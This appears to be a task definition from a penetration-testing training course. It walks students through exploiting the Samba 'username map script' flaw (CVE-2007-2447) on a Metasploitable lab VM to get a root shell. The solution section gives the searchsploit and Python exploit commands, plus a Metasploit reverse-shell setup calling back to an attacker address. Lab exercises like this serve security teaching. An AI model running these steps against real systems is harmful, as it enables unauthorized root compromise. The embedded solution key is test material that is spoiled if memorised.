@@ -1,0 +1,14 @@
+{
+    "id": "task4",
+    "chapterId": "ch_7",
+    "title": "Samba Username Map Script Exploit",
+    "description": "Manually exploit Samba 3.0.20 using a Python script from Exploit-DB.",
+    "estimatedMinutes": 25,
+    "problemStatement": "# Objective\nManually exploit the Samba 'Username Map Script' vulnerability (CVE-2007-2447) using a Python PoC script.\n\n## Steps\n1.  Use `searchsploit` to find an exploit for Samba 3.0.20.\n2.  Locate a Python script (e.g., `16320.py`). Copy it to your working directory:\n    ```bash\n    searchsploit -m 16320\n    ```\n3.  Examine the script: `cat 16320.py`. Note the usage instructions.\n4.  Run the script against Metasploitable:\n    ```bash\n    python 16320.py 192.168.56.101 139\n    ```\n5.  If successful, you should receive a root shell prompt.\n\n## Deliverable\nScreenshot of the successful shell and output of `whoami`.\n\n**Note**: If the script doesn't work due to Python 2 vs 3 issues, use the Metasploit module `exploit/multi/samba/usermap_script` as a fallback, but document the attempt to use the manual script.",
+    "hints": [
+        "Ensure you have Python 2 installed if the script is old: `sudo apt install python2`.",
+        "Run with `python2 script.py` if needed."
+    ],
+    "expectedOutput": "Root shell with `uid=0(root)`.",
+    "solutionCode": "# Search for exploit\nsearchsploit samba 3.0.20\n\n# Copy Python exploit (adjust number based on output)\nsearchsploit -m 16320\n\n# Run exploit\npython2 16320.py 192.168.56.101 139\n\n# If it fails, use Metasploit as fallback:\n# msf6 > use exploit/multi/samba/usermap_script\n# msf6 > set RHOSTS 192.168.56.101\n# msf6 > set PAYLOAD cmd/unix/reverse\n# msf6 > set LHOST 192.168.56.102\n# msf6 > exploit"
+}
